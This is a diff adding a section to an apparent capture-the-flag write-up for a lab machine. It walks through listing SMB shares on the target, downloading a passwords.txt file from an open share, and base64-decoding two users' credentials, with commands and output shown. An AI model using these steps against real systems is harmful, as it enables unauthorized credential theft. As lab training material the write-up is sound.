@@ -82,3 +82,54 @@ Interesting points here:
 - SMB port open
   - user account guest is available  
 - RDP port 3389 open
+
+## Starting now with SMB
+
+First see what shares are quickly available:
+```
+└─$ smbclient -L THM_Target 
+Password for [WORKGROUP\hacktopuser]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        nt4wrksv        Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to THM_Target failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+```
+Sharename nt4wrksv appears to be accessible a quick search finds:
+- A single file password.txt.
+- no other files or directories accessible.
+
+```
+└─$ smbclient \\\\THM_Target\\nt4wrksv
+Password for [WORKGROUP\hacktopuser]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat May 16 03:16:33 2026
+  ..                                  D        0  Sat May 16 03:16:33 2026
+  passwords.txt                       A       98  Sun Jul 26 01:15:33 2020
+
+                7735807 blocks of size 4096. 5097415 blocks available
+smb: \> GET passwords.txt
+getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+```
+Passwords file did contain 2 passwords:
+```
+┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Relevant]
+└─$ cat passwords.txt                                            
+[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                                                             
+┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Relevant]
+└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw=="| base64 -d
+Bob - !P@$$W0rD!123                                                                             
+┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Relevant]
+└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d    
+Bill - Juw4nnaM4n420696969!$$$                        
+```
+
+  
